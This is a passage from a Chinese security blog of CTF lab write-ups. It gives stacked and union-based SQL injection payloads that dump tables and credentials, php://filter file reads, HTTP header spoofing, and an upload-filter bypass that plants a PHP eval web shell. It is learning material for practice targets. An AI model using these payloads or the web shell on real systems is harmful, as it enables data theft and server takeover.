<p>发现只有id与data两个字段,应该不存在flag,继续看下一个表先。<br><img src="https://pic.imgdb.cn/item/653c984cc458853aefb9dd3d.jpg" alt="图二十六" title="堆叠爆字段"><br>注意:<br>对于纯数字的表名,要用&#96;&#96;括起来<br>就是tableName是纯数字，需要用<code>包裹，比如 方式一:1&#39;;desc </code>1919810931114514<code>;# 方式二:1&#39;; show columns from</code>1919810931114514&#96;;#<br>发现存在flag字段,就差一步了,加油。<br><img src="https://pic.imgdb.cn/item/653c9861c458853aefba4716.jpg" alt="图二十七" title="爆出存在flag的表"><br>最后读取这一步,又不会了,继续借鉴。<br>!!!该题目的查询语句很有可能是：selsect id,data from words where id &#x3D;，因为我们输入1，回显的是两个字段，这与words表符合，而1919810931114514表中只有一列,那怎么办呢。<br>4种方法:<br>1、多方了解,才想到改名,就是它的查询语句是selsect id,data from words where id &#x3D;,那么我们令原来的words表为另一个名字,而我们的目标1919810931114514这张表改为words,那么我们查询的时候,就会带入这个带有flag的表查询,从而爆出flag。<br>数据库知识:<br>修改表名：ALTER TABLE 旧表名 RENAME TO 新表名；<br>修改字段：ALTER TABLE 表名 CHANGE 旧字段名 新字段名 新数据类型；<br>构造payload:把words随便改成words1，然后把1919810931114514改成words，再把列名flag改成id(或data)。</p>
<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript"><span class="hljs-number">1</span>&#x27;;alter table <span class="hljs-built_in">words</span> rename <span class="hljs-keyword">to</span> words1;alter table `<span class="hljs-number">1919810931114514</span>` rename <span class="hljs-keyword">to</span> <span class="hljs-built_in">words</span>;alter table <span class="hljs-built_in">words</span> change flag <span class="hljs-built_in">id</span> varchar(<span class="hljs-number">50</span>);<span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure>
<p>这就实现了改名功能,只爆一个字段(id&#x2F;data)不影响,然后像刚开始那样子测试有无注入点那样,直接爆出flag。<br><img src="https://pic.imgdb.cn/item/653c986cc458853aefba7b6f.jpg" alt="图二十八" title="改名爆flag"><br>后面三种搬运一下,做知识总结。<br>2、handle函数。<br>handle不是通用的SQL语句，是Mysql特有的，可以逐行浏览某个表中的数据，格式：<br>打开表：HANDLER 表名 OPEN ;<br>查看数据： HANDLER 表名 READ next;<br>关闭表： HANDLER 表名 READ CLOSE;</p>
<figure class="highlight julia"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs julia"><span class="hljs-number">1</span>&#x27;;HANDLER <span class="hljs-string">`1919810931114514`</span> OPEN;HANDLER <span class="hljs-string">`1919810931114514`</span> READ next;HANDLER <span class="hljs-string">`1919810931114514`</span> CLOSE;<span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure>
<p>3、预编译方式<br>因为select关键字被过滤了，所以我们可以通过预编译的方式拼接select 关键字：<br>预编译相当于定一个语句相同，参数不同的Mysql模板，我们可以通过预编译的方式，绕过特定的字符过滤,格式：<br>1.PREPARE 名称 FROM Sql语句 ? ;<br>2.SET @x&#x3D;xx;<br>EXECUTE 名称 USING @x;<br>例子:1’;PREPARE hacker from concat(‘s’,’elect’, ‘ * from <code>1919810931114514</code> ‘);EXECUTE  hacker;#<br>将select * from <code>1919810931114514</code>语句进行16进制编码，即：0x73656c656374202a2066726f6d2060313931393831303933313131343531346</p>
<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c"><span class="hljs-number">1</span>&#x27;;PREPARE ck from 0x<span class="hljs-number">7365</span>6c<span class="hljs-number">65637420</span>2a<span class="hljs-number">206672</span>6f6d<span class="hljs-number">20603139313938</span><span class="hljs-number">31303933313131</span><span class="hljs-number">3435313460</span>;EXECUTE  ck;#<br></code></pre></td></tr></table></figure>
<p>4、利用MySql预处理<br>使用条件：HANDLER也被过滤了。<br>在遇到堆叠注入时，如果select、rename、alter和handler等语句都被过滤的话，我们可以用MySql预处理语句配合concat拼接来执行sql语句拿flag。<br>最后总结一句话:安全与开发缺一不可。<br>参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_44640313/article/details/128308237">https://blog.csdn.net/qq_44640313/article/details/128308237</a></p>
<h2 id="SUCTF-2019-EasySQL"><a href="#SUCTF-2019-EasySQL" class="headerlink" title="[SUCTF 2019]EasySQL"></a>[SUCTF 2019]EasySQL</h2><p>进入靶机,首先判断有无注入点。<br>输入1以上的int数据,发现有回显;而输入其他值则无回显。<br><img src="https://pic.imgdb.cn/item/65420741c458853aeff5cc1b.jpg" alt="图二十九" title="回显"><br><img src="https://pic.imgdb.cn/item/65420750c458853aeff5f3e6.jpg" alt="图三十" title="回显"><br>进一步测试,测试是数字型注入或者是字符行注入。</p>
<figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">1 </span><span class="hljs-keyword">and</span> <span class="hljs-number">1</span>=<span class="hljs-number">1#</span><br><span class="hljs-symbol">1 </span><span class="hljs-keyword">or</span> <span class="hljs-number">1</span>=<span class="hljs-number">1#</span><br><span class="hljs-number">1</span><span class="hljs-comment">&#x27; and 1=1#</span><br><span class="hljs-number">1</span><span class="hljs-comment">&#x27; or 1=1#</span><br></code></pre></td></tr></table></figure>
<p>这些payload全都测试过了,无一例外,全都回显nonono。<br><img src="https://pic.imgdb.cn/item/6542078ac458853aeff685d1.jpg" alt="图三十一" title="发现存在过滤"><br>说明存在and过滤|输出nonono说明存在过滤,存在对某一个字符串的过滤。<br>既然存在注入,连盲注都不能测试了,因为盲注语句也用到and&#x2F;or&#x2F;updatexml等。</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">username</span>=xiaodi&#x27;or updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x7e,version(),<span class="hljs-number">0</span>x7e),<span class="hljs-number">0</span>) or&#x27;&amp;password=<span class="hljs-number">123456</span><br></code></pre></td></tr></table></figure>
<p>那就只能尝试堆叠注入了。<br>输入payload:</p>
<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-number">1</span><span class="hljs-comment">;show databases;</span><br></code></pre></td></tr></table></figure>
<p>成功爆出数据库。<br><img src="https://pic.imgdb.cn/item/65420797c458853aeff6a7d3.jpg" alt="图三十二" title="爆库"><br>接着爆表。</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-number">1</span>;<span class="hljs-keyword">show</span> <span class="hljs-keyword">tables</span>;<br></code></pre></td></tr></table></figure>
<p><img src="https://pic.imgdb.cn/item/654207a6c458853aeff6cf7e.jpg" alt="图三十三" title="爆表"><br>再尝试爆表的字段</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-number">1</span>;<span class="hljs-keyword">show</span> <span class="hljs-keyword">columns</span> <span class="hljs-keyword">from</span> FLAG;<br></code></pre></td></tr></table></figure>
<p>输出nonono,发现对flag存在过滤。<br>到这里,思路戛然而止,暂停略微参考一下wp。<br>接下来回顾一下最开始我们输入的非0数字和0与字母所回显的内容：非0数字回显1,0和字母不会回显任何内容<br>先了解一下||操作符：<br>在MySQL中，操作符||表示“或”逻辑：<br>command1 || command2<br>c1和c2其中一侧为1则取1，否则取0<br> 这里猜测后端语句，因为只有当我们输入非零数字时才会会显出1，而0和其他全都无回显,而猜测逻辑大致是这样的：大胆猜测后端（内部查询语句）语句中有||操作符，只有我们输入非零数字才会满足||的逻辑为True从而进行回显的条件。也就是满足:select 输入的内容 ||  一个列名 from 表名。（select 输入数据 || flag from Flag）<br>确实很大胆.真的没想到ctf的题会这样考,利用mysql的’||’的逻辑把flag藏到后面,有回显但是回显’||’前面判断为真或假的值,以这样的方式藏flag。<br>那么这样的话,构造payload,就把mysql中’||’的逻辑改成连接的逻辑:</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs routeros">1;<span class="hljs-built_in">set</span> <span class="hljs-attribute">sql_mode</span>=PIPES_AS_CONCAT;select 1<br>注：<br>(mssql中的<span class="hljs-string">&#x27;||&#x27;</span>就是连接的逻辑)<br>1、这里需要借用到：设置 <span class="hljs-attribute">sql_mode</span>=PIPES_AS_CONCAT来转换操作符的作用。（sql_mode设置）。<br>2、这里的逻辑是先把||转换为连接操作符，注意分号隔断了前面的命令，所以要再次添加select来进行查询，这里把1换成其他非零数字也一样会回显flag。<br></code></pre></td></tr></table></figure>
<p>这样就可获取到flag。<br><img src="https://pic.imgdb.cn/item/654207b5c458853aeff6f5a1.jpg" alt="图三十四" title="修改mysql的&#39;||&#39;的逻辑爆flag"><br>参考:<code>https://blog.csdn.net/m0_62851980/article/details/124083026</code><br>总结出一套做sql注入的思路<br>1、先判断有无注入点:把字符全试一遍,看看有无规律,找出其逻辑;<br>   再用and&#x2F;or进一步判断;<br>2、再爆列数;<br>3、联合查询,先爆库,再爆表,再爆字段,最后爆数据;<br>4、若存在select等过滤,用到报错盲注或堆叠注入。</p>
<h2 id="极客大挑战-2019-Secret-File"><a href="#极客大挑战-2019-Secret-File" class="headerlink" title="[极客大挑战 2019]Secret File"></a>[极客大挑战 2019]Secret File</h2><p>打开靶机,显示xxx的秘密,我不关心,我只关心zhaoflag然后吃西瓜。<br>看源码,有一个超链接,点开看一下,发现跳转到另一个界面,有一个大大的SELECT;点击进去,来到一个看起来是最后一个界面的界面,抓包看一下<br>发现一个文件<br><img src="https://pic.imgdb.cn/item/65421219c458853aef12072f.jpg" alt="图三十五" title="我只会吃西瓜"><br>跳转过去,发现flag所处位置以及文件的接收方式是以file作为属性接收的,且以get方式提交。<br><img src="https://pic.imgdb.cn/item/65421235c458853aef124699.jpg" alt="图三十六" title="serc3t的内容(这是一个关键的文件)"><br>进入flag.php,发现是一场空欢喜。<br><img src="https://pic.imgdb.cn/item/654212dec458853aef13d351.jpg" alt="图三十七" title="空欢喜"><br>看不到flag,那么就又要考虑到php伪协议。</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/read=convert.base64-encode/</span>resource=flag.php<br></code></pre></td></tr></table></figure>
<p>看到flag。<br><img src="https://pic.imgdb.cn/item/654212e4c458853aef13e159.jpg" alt="图三十八" title="php伪协议获取base64编码的flag"><br>看编码形式像base64编码,解码即可。得到flag。<br><img src="https://pic.imgdb.cn/item/654212f1c458853aef140081.jpg" alt="图三十九" title="解码得到flag"></p>
<p><code>!!!发现php伪协议配合文件包含挺多的。学习一下php伪协议。</code></p>
<h3 id="php伪协议"><a href="#php伪协议" class="headerlink" title="php伪协议"></a>php伪协议</h3><p>1、配合文件读取,即网址栏含有?file&#x3D;或?filename&#x3D;诸如此类的字段–前提<br>2、再配合文件包含,即猜测其代码存在include某一个文件–关键<br>3、这样,即可尝试使用php伪协议读取那个文件。<br>常用payload(做题暂只遇到这一种):</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>xxx.xxx.xxx<span class="hljs-regexp">/index.php?filename=php:/</span><span class="hljs-regexp">/filter/</span>read=convert.base64-encode/resource=xxx.php<br>作用:读取当前文件包含的文件。<br></code></pre></td></tr></table></figure>
<p>推荐阅读(详细讲解):<br><code>https://www.php.cn/faq/481803.html</code><br><code>https://blog.csdn.net/qq_37466661/article/details/126203437</code><br><code>https://blog.csdn.net/m0_56107268/article/details/127760614</code><br>但也存在限制,具体的限制看我的博客:<code>https://fzsecurity-github.github.io/2023/10/14/wenjianbaohan/?highlight=%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB</code></p>
<h2 id="极客大挑战-2019-LoveSQL"><a href="#极客大挑战-2019-LoveSQL" class="headerlink" title="[极客大挑战 2019]LoveSQL"></a>[极客大挑战 2019]LoveSQL</h2><p>嗯,我很爱sql……<br>进入靶机,是一个登陆界面,首先正常输入账号密码,嗯,返回一个账号密码错误的界面。那么测试有无注入点。</p>
<figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">1 </span><span class="hljs-keyword">and</span> <span class="hljs-number">1</span>=<span class="hljs-number">1#</span><br><span class="hljs-symbol">1 </span><span class="hljs-keyword">or</span> <span class="hljs-number">1</span>=<span class="hljs-number">1#</span><br><span class="hljs-number">1</span><span class="hljs-comment">&#x27; and 1=1#</span><br><span class="hljs-number">1</span><span class="hljs-comment">&#x27; or 1=1#</span><br></code></pre></td></tr></table></figure>
<p>其中,在账号栏一行中输入1’ or 1&#x3D;1#而且密码栏随便输入(以为存在先判断密码栏是否为空,再判断账号密码是否对上),发现即使不输入密码也显示出来信息。<br><img src="https://pic.imgdb.cn/item/65427681c458853aef667be3.jpg" alt="图四十" title="测试有无注入点时直接获取一个信息"><br>思考,我刚开始以为是某种编码,但是尝试了很多种编码的解码,一一失败,判定为乱码,那么只能进一步注入。<br>前期知道为字符型get注入,那么先判定字段数。<br>首先测试3字段,发现正常报错(输出查询异常信息);但是输入4的时候直接报错显示不存在4这个字段。即判定3字段。</p>
<figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh"><span class="hljs-number">1</span>&#x27; <span class="hljs-keyword">order</span> <span class="hljs-title">by</span> <span class="hljs-number">4</span><span class="hljs-comment">#;</span><br></code></pre></td></tr></table></figure>
<figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh"><span class="hljs-number">1</span>&#x27; <span class="hljs-keyword">order</span> <span class="hljs-title">by</span> <span class="hljs-number">3</span><span class="hljs-comment">#;</span><br></code></pre></td></tr></table></figure>
<p><img src="https://pic.imgdb.cn/item/65427699c458853aef66db16.jpg" alt="图四十一" title="4列报错"><br><img src="https://pic.imgdb.cn/item/654276a5c458853aef670c4b.jpg" alt="图四十二" title="3行正常"><br>随后显示具体字段在哪个位置爆出<br>payload(密码随便填)：</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">1</span>&#x27; union select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>#<br></code></pre></td></tr></table></figure>
<p><img src="https://pic.imgdb.cn/item/654276cfc458853aef67f284.jpg" alt="图四十三" title="知道爆数据的位置"><br><code>这里有一个注意点:</code><br><code>经过测试,猜测该网站的后台代码会对接受过来的数据进行一次url解码,所以你在url栏输入payload时,你要进行url编码再填充进去。</code><br><code>如果你直接在账号输入栏测试则不需要。</code><br>好了,开始ggboom。<br>首先爆一些数据库名字,版本的相关信息。</p>
<figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gauss"><span class="hljs-number">1</span>&#x27; <span class="hljs-built_in">union</span> <span class="hljs-built_in">select</span> <span class="hljs-number">1</span>,<span class="hljs-built_in">database</span>(),<span class="hljs-built_in">version</span>()<span class="hljs-meta">#</span><br></code></pre></td></tr></table></figure>
<p><img src="https://pic.imgdb.cn/item/6543096cc458853aef746dc3.jpg" alt="图四十四" title="爆数据库基本信息"><br>然后,可以尝试使用mysql注入的思路,先判断mariaDB是否存在关键的几张表。<br><img src="https://pic.imgdb.cn/item/654309a5c458853aef74ec96.jpg" alt="图四十五" title="选择思路"><br>那么可以使用注入mysql数据库的思路。<br>爆库(可省略)</p>
<figure class="highlight capnproto"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs capnproto"><span class="hljs-number">1</span>&#x27; <span class="hljs-keyword">union</span> select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(schema_name) <span class="hljs-keyword">from</span> information_schema.schemata<span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure>
<p><img src="https://pic.imgdb.cn/item/654309c5c458853aef753670.jpg" alt="图四十六" title="爆库"><br>爆表</p>
<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-number">1&#x27;</span> union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(table_name) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;geek&#x27;</span><span class="hljs-meta">#</span><br></code></pre></td></tr></table></figure>
<p><img src="https://pic.imgdb.cn/item/654309d7c458853aef756b74.jpg" alt="图四十七" title="爆表"><br>爆字段(先爆l0ve1ysq1这张表,再爆geekuser这张表)</p>
<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-number">1&#x27;</span> union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(column_name) <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_name=<span class="hljs-string">&#x27;l0ve1ysq1&#x27;</span><span class="hljs-meta">#</span><br></code></pre></td></tr></table></figure>
<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-number">1&#x27;</span> union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(column_name) <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_name=<span class="hljs-string">&#x27;geekuser&#x27;</span><span class="hljs-meta">#</span><br></code></pre></td></tr></table></figure>
<p>发现字段都一样<br><img src="https://pic.imgdb.cn/item/654309e1c458853aef758713.jpg" alt="图四十八" title="爆字段"><br>那么爆字段值(数据)吧</p>
<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-number">1</span>&#x27; union select <span class="hljs-number">1</span>,group<span class="hljs-constructor">_concat(<span class="hljs-params">username</span>)</span>,group<span class="hljs-constructor">_concat(<span class="hljs-params">password</span>)</span> from geekuser#<br></code></pre></td></tr></table></figure>
<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-number">1</span>&#x27; union select <span class="hljs-number">1</span>,group<span class="hljs-constructor">_concat(<span class="hljs-params">username</span>)</span>,group<span class="hljs-constructor">_concat(<span class="hljs-params">password</span>)</span> from l0ve1ysq1#<br></code></pre></td></tr></table></figure>
<p> geekuser表中数据为<br> <img src="https://pic.imgdb.cn/item/654309fec458853aef75d16e.jpg" alt="图四十九" title="爆数据(字段)--geekuser"><br> geekuser的数据还是乱码,解析不了。那么寄希望于下一张表,l0ve1ysq1表中数据为<br> <img src="https://pic.imgdb.cn/item/65430a0fc458853aef75f9aa.jpg" alt="图五十" title="爆数据(字段)--l0ve1ysq1"><br>看不全,查看源码,获取flag<br> <img src="https://pic.imgdb.cn/item/65430a1ec458853aef761bbd.jpg" alt="图五十一" title="获取flag"><br> 总算是一道正常的没有堆叠的注入题了…嗯,lovesql。</p>
<h2 id="极客大挑战-2019-Http"><a href="#极客大挑战-2019-Http" class="headerlink" title="[极客大挑战 2019]Http"></a>[极客大挑战 2019]Http</h2><p>打开靶机,界面是一个正常的网页,第一件事先看源码,发现确实有一个.php文件可以访问。<br><img src="https://pic.imgdb.cn/item/654317b9c458853aef96c798.jpg" alt="图五十二" title="发现关键key"><br>尝试访问,发现是一个warning,提示来源(Referer)必须是<a target="_blank" rel="noopener" href="https://sycsecret.buuoj.cn/">https://Sycsecret.buuoj.cn</a><br><img src="https://pic.imgdb.cn/item/65431865c458853aef9861b9.jpg" alt="图五十三" title="warning"><br>抓包修改,wp说:<code>这里有一个注意点，那就是你加的Referer字段必须在connection字段下面,不然会报错</code> –为什么,就算没在下面也可以<br><img src="https://pic.imgdb.cn/item/65431882c458853aef98a7ac.jpg" alt="图五十四" title="改包"><br>提示要使用浏览器Syclover,那么在user-agent字段修改<br><img src="https://pic.imgdb.cn/item/654318dbc458853aef996b19.jpg" alt="图五十五" title="二次改包"><br>提示要本地访问,那么添加一个X-Forwarded-For字段,值为127.0.0.1即可获取flag<br><img src="https://pic.imgdb.cn/item/65431904c458853aef99cb0d.jpg" alt="图五十六" title="改包获取flag"><br><code>(建议康康)关于数据包的一些讲解:https://blog.csdn.net/qq_63548648/article/details/128083782</code></p>
<h2 id="极客大挑战-2019-Knife"><a href="#极客大挑战-2019-Knife" class="headerlink" title="[极客大挑战 2019]Knife"></a>[极客大挑战 2019]Knife</h2><p>打开靶机,提示菜刀不见了,还给了一句话木马,推测其网站下的目录存在有包含这个一句话木马的文件。想都不用想,连接上去就完事了。<br><img src="https://pic.imgdb.cn/item/65435b00c458853aef573dbc.jpg" alt="图五十七" title="看到一句话木马,直接连接"><br>点击测试连接,提示连接成功,成功getshell,就可getflag。<br><img src="https://pic.imgdb.cn/item/65435b11c458853aef576820.jpg" alt="图五十八" title="getshell|getflag"><br>这么简单?不可置信,看了看源码,嗯果然是白给的shell…</p>
<h2 id="极客大挑战-2019-Upload"><a href="#极客大挑战-2019-Upload" class="headerlink" title="[极客大挑战 2019]Upload"></a>[极客大挑战 2019]Upload</h2><p>开启靶机,发现是一个标准的文件上传的界面(挺好看的感觉)。<br>e,说回正题,我们先尝试直接上传.php文件看能不能一发入魂。<br><img src="https://pic.imgdb.cn/item/654afb56c458853aef788d76.jpg"><br>显然不能,存在过滤。<br>那么接下来我们就要思考如何实现绕过,上传包含一句话木马的文件,直接getshell。<br><code>MIME值绕过</code><br>抓包把MIME(Content-Type)的值改为正常的图片形式。</p>
<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs arduino">image/png<br>image/jpg<br></code></pre></td></tr></table></figure>
<p>还是可以识别出来,pass。<br><img src="https://pic.imgdb.cn/item/654b0dc4c458853aefa98ee0.jpg"><br><code>大小写混写</code><br>亲测,不可以实现绕过。<br><code>php双写|把后缀直接改为php5、phtml等格式</code><br>可以绕过对于文件名的过滤,那么判断文件后缀检验方式为黑名单检测。<br>但是对文件内容&lt;?存在过滤。<br><img src="https://z1.ax1x.com/2023/11/08/pi1hxTs.jpg"><br>接下来思考:<code>如何绕过网站对文件内容的检测</code><br>那是不是有这样的思路:<code>既然你对php的标记有检测,那我可不可以使用php+java混编实现绕过?</code></p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">language</span>=<span class="hljs-string">&#x27;php&#x27;</span>&gt;</span><span class="language-javascript">@<span class="hljs-built_in">eval</span>($_POST[<span class="hljs-string">&#x27;111&#x27;</span>]);</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure>
<p>但是发现还是绕过不了。<br><img src="https://pic.imgdb.cn/item/654b5c94c458853aefa8a4d3.jpg"><br>说明服务器不仅对前端进行了过滤，还对后端文件内容头做了校验。这里我们只能用文件幻术头来绕过试试。<br><code>GIF89a-文件幻术头绕过</code><br>一个GIF89a图形文件就是一个根据图形交换格式（GIF）89a版（1989年7 月发行）进行格式化之后的图形。在GIF89a之前还有87a版（1987年5月发行），但在Web上所见到的大多数图形都是以89a版的格式创建的。 89a版的一个最主要的优势就是可以创建动态图像，例如创建一个旋转的图标、用一只手挥动的旗帜或是变大的字母。特别值得注意的是，一个动态GIF是一个 以GIF89a格式存储的文件，在一个这样的文件里包含的是一组以指定顺序呈现的图片。<br>这里上传成功了,但是双写好像不行,推测它对文件名的遍历方式是记录前面的值,取这个全部遍历完后的值与黑名单匹配。那么浏览器可能解析不了,只能把后缀改为.phtml。<br><img src="https://pic.imgdb.cn/item/654b5cd7c458853aefa94b35.jpg"><br><img src="https://pic.imgdb.cn/item/654b5cf9c458853aefa9adb8.jpg"><br>上传成功后,那么就连接木马了。但这里,没有给出目录。<code>做题做多了,这种ctf一般不会太恶心,猜测存放上传文件的文件夹目录为upload</code><br>连接成功<br><img src="https://pic.imgdb.cn/item/654b5d46c458853aefaaa63e.jpg"><br>接下来就是愉快的找flag环节啦!<br>一般都在根目录下。成功获取flag。<br><img src="https://pic.imgdb.cn/item/654b5d60c458853aefaaf882.jpg"><br>from:<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_49025459/article/details/124723482">https://blog.csdn.net/m0_49025459/article/details/124723482</a></p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://fzsecurity-github.github.io">Dralin Feng</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://fzsecurity-github.github.io/2023/10/27/buuojctf/">http://fzsecurity-github.github.io/2023/10/27/buuojctf/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://fzsecurity-github.github.io" target="_blank">Dralin's SweetNest</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E5%AE%9E%E6%88%98%E7%BB%83%E4%B9%A0%E5%BF%83%E5%BE%97/">实战练习心得</a></div><div class="post_share"><div class="social-share" data-image="/img/reHe.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2023/10/29/csoeDGUT/" title="200wCSOE|Recording"><img class="cover" src="/img/reHe.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">200wCSOE|Recording</div></div></a></div><div class="next-post pull-right"><a href="/2023/10/24/xxexml/" title="XXE|XML|利用检测绕过"><img class="cover" src="/img/preview.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">XXE|XML|利用检测绕过</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2023/10/11/XssSelfPrac/" title="利用beef实现简单的XSS跨站攻击"><img class="cover" src="/img/reHe.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-10-11</div><div class="title">利用beef实现简单的XSS跨站攻击</div></div></a></div><div><a href="/2023/10/12/XssSelfPrac2/" title="XSS-labs通关little心得"><img class="cover" src="https://pic.imgdb.cn/item/6545b9a8c458853aefbbd923.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-10-12</div><div class="title">XSS-labs通关little心得</div></div></a></div><div><a href="/2023/10/21/cmslogicLoudong/" title="业务逻辑|白盒环境下某cms渗透测试"><img class="cover" src="/img/reHe.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-10-21</div><div class="title">业务逻辑|白盒环境下某cms渗透测试</div></div></a></div><div><a href="/2023/10/29/csoeDGUT/" title="200wCSOE|Recording"><img class="cover" src="/img/reHe.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-10-29</div><div class="title">200wCSOE|Recording</div></div></a></div><div><a href="/2023/10/24/fanxuliehuaPrac/" title="php|反序列化|本地|bugku"><img class="cover" src="https://pic.imgdb.cn/item/6545b9a8c458853aefbbd923.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-10-24</div><div class="title">php|反序列化|本地|bugku</div></div></a></div><div><a href="/2023/11/04/my-serve-file/" title="my_serve_file|Record"><img class="cover" src="https://pic.imgdb.cn/item/6545b9a8c458853aefbbd923.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-11-04</div><div class="title">my_serve_file|Record</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Dralin Feng</div><div class="author-info__description">A Little Blog Of Dralin</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div 